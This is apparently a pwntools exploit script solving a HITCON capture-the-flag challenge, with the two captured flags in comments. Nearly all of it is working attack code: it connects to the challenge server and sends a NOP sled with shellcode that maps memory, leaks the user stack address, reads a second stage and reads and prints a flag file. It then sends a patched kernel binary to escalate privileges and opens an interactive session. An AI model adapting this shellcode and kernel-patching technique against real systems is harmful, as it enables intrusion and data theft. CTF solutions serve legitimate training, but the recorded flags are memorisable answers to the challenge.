#!/usr/bin/env python
from pwn import *

# hitcon{Go_ahead,_traveler,_and_get_ready_for_deeper_fear.}
# hitcon{take_out_all_memory,_take_away_your_soul}

context.arch = 'amd64'
host , port = '35.200.23.198' , 31733
y = remote( host , port )

kernel = open( './kernel.bin' ).read()

s = '31a-\\a:2107732+a;,' + '\x90' * 70
s += asm(
    '''
    mov rdi, 0
    mov rsi, 0x1000000
    mov rdx, 7
    mov r10, 16
    mov r8, -1
    mov r9, 0
    mov rax, 8
    inc rax
    syscall

    mov rbp, rax
    push rsp
    ''' +
    shellcraft.write( 1 , 'rsp' , 8 ) + 
    shellcraft.read( 0 , 'rbp' , 0x1000000 ) +
    shellcraft.pushstr( 'flag2\x00' ) + 
    shellcraft.open( 'rsp' , 0 , 0 ) +
    shellcraft.read( 'rax' , 'rsp' , 0x70 ) +
    shellcraft.write( 1 , 'rsp' , 0x70 )
)

y.sendlineafter( 'down.' , s )
y.recvline()
user_stack = u64( y.recv(8) )
success( 'User stack -> %s' % hex( user_stack ) )

k_mod = kernel[:0x14d] + p64( 0x8002000000 ) + p64( user_stack + 0x100 ) + kernel[0x15d:0x9a4] + '\x90' * 0x75

sleep(1)
y.send( k_mod )

y.interactive()


